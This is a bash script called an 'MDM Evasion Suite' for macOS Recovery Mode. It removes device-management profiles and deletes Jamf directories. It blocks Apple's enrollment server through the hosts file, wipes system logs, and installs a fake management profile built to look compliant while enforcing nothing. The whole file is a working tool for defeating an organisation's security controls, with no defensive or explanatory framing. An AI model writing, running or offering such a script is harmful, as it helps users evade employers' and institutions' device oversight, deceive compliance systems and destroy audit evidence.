#!/bin/bash

echo "MDM Evasion Suite initiated. Proceed with discretion..."

# Ensure system volume is writable
echo "Mounting system volume as writable..."
mount -uw /Volumes/Macintosh\ HD
if [ $? -ne 0 ]; then
    echo "Error: Failed to mount system volume as writable. Ensure you're in Recovery Mode."
    exit 1
fi

# Backup hosts file before changes
echo "Backing up hosts file..."
cp /Volumes/Macintosh\ HD/etc/hosts /Volumes/Macintosh\ HD/etc/hosts.backup
if [ $? -eq 0 ]; then
    echo "Backup created: /etc/hosts.backup"
else
    echo "Failed to back up hosts file. Proceeding with caution."
fi

# Detect and remove MDM profile
echo "Detecting MDM presence..."
MDM_PROFILE_ID=$(profiles -P | grep -oE 'uuid:[0-9A-F-]+' | cut -d: -f2 | tr -d ' ' | head -1)

if [ -n "$MDM_PROFILE_ID" ]; then
    echo "MDM Profile detected: $MDM_PROFILE_ID"
    profiles -R -p "$MDM_PROFILE_ID"
    if [ $? -eq 0 ]; then
        echo "MDM profile successfully removed."
    else
        echo "Failed to remove MDM profile. Creating bypass profile instead."
        bypass_profile=true
    fi
else
    echo "No MDM profile found."
fi

# Recheck MDM profile after removal
echo "Verifying MDM profile removal..."
profiles -P | grep "uuid" > /dev/null
if [ $? -ne 0 ]; then
    echo "MDM profile confirmed removed."
else
    echo "Warning: MDM profile still detected. Creating bypass profile."
    bypass_profile=true
fi

# Block DEP servers to prevent re-enrollment
echo "Blocking DEP servers..."
if ! grep -q "mdmenrollment.apple.com" /Volumes/Macintosh\ HD/etc/hosts; then
    echo "127.0.0.1 mdmenrollment.apple.com" >> /Volumes/Macintosh\ HD/etc/hosts
    if [ $? -eq 0 ]; then
        echo "DEP server successfully blocked."
    else
        echo "Failed to block DEP server."
    fi
else
    echo "DEP server already blocked."
fi

# Verify DEP blocking
echo "Verifying DEP server block..."
grep "mdmenrollment.apple.com" /Volumes/Macintosh\ HD/etc/hosts
if [ $? -eq 0 ]; then
    echo "DEP block confirmed."
else
    echo "Warning: DEP blocking failed. Check /etc/hosts manually."
fi

# Remove Jamf or other MDM frameworks
echo "Removing MDM framework if present..."
for dir in "/Volumes/Macintosh HD/usr/local/jamf" "/Volumes/Macintosh HD/Library/Application Support/Jamf"; do
    if [ -d "$dir" ]; then
        rm -rf "$dir"
        if [ $? -eq 0 ]; then
            echo "MDM framework removed from $dir"
        else
            echo "Failed to remove MDM framework at $dir"
        fi
    else
        echo "No MDM framework found at $dir"
    fi
done

# Flush system cache
echo "Flushing system cache..."
dscacheutil -flushcache && killall -HUP mDNSResponder
if [ $? -eq 0 ]; then
    echo "Cache successfully cleared."
else
    echo "Failed to clear cache."
fi

# Enable firewall stealth mode
echo "Configuring firewall for stealth mode..."
if [ -f "/Volumes/Macintosh HD/usr/libexec/ApplicationFirewall/socketfilterfw" ]; then
    /Volumes/Macintosh\ HD/usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
    if [ $? -eq 0 ]; then
        echo "Firewall set to stealth mode."
    else
        echo "Failed to enable stealth mode."
    fi
else
    echo "Firewall management not available in Recovery Mode."
fi

# Reset NVRAM
echo "Resetting NVRAM..."
nvram -c
if [ $? -eq 0 ]; then
    echo "NVRAM reset successfully."
else
    echo "Failed to reset NVRAM."
fi

# Clear recovery logs
echo "Clearing recovery logs..."
rm -rf /var/log/*.log
if [ $? -eq 0 ]; then
    echo "Recovery logs cleared."
else
    echo "Failed to clear recovery logs."
fi

# Create and install bypass profile if removal fails
if [ "$bypass_profile" = true ]; then
    echo "Creating MDM bypass profile..."
    cat <<EOF > /Volumes/Macintosh\ HD/tmp/bypass_mdm.mobileconfig
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.mdm</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>ServerURL</key>
            <string>https://localhost/mdm</string>
            <key>CheckInURL</key>
            <string>https://localhost/checkin</string>
            <key>Topic</key>
            <string>com.apple.mgmt.External</string>
            <key>SignMessage</key>
            <false/>
            <key>AccessRights</key>
            <integer>8191</integer>
            <key>CheckOutWhenRemoved</key>
            <true/>
            <key>PayloadIdentifier</key>
            <string>com.bypass.mdm</string>
            <key>PayloadUUID</key>
            <string>12345678-1234-1234-1234-123456789abc</string>
            <key>PayloadDisplayName</key>
            <string>MDM Bypass Profile</string>
            <key>PayloadDescription</key>
            <string>This profile satisfies MDM requirements but does not enforce any restrictions.</string>
            <key>PayloadOrganization</key>
            <string>Bypass MDM</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>MDM Bypass Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.bypass.mdm</string>
    <key>PayloadUUID</key>
    <string>abcd1234-5678-9101-1121-314151617181</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>
EOF

    if [ -f "/Volumes/Macintosh HD/tmp/bypass_mdm.mobileconfig" ]; then
        echo "Bypass profile created successfully. Installing now..."
        profiles -I -F /Volumes/Macintosh\ HD/tmp/bypass_mdm.mobileconfig
        if [ $? -eq 0 ]; then
            echo "Bypass profile installed successfully."
        else
            echo "Failed to install bypass profile."
        fi
    else
        echo "Failed to create bypass profile."
    fi
fi

# Final MDM verification
echo "Final verification of MDM status..."
profiles -P | grep "uuid"
if [ $? -ne 0 ]; then
    echo "No MDM profiles detected. System appears clean."
else
    echo "Warning: MDM profiles still detected. Manual intervention may be required."
fi

# Restart prompt
echo "MDM and DEP bypass complete. A system restart is recommended."
read -p "Do you want to restart now? (y/N): " confirm
if [[ "$confirm" =~ ^[Yy]$ ]]; then
    echo "Restarting system..."
    reboot
else
    echo "Restart skipped. Manual restart recommended."
fi

exit 0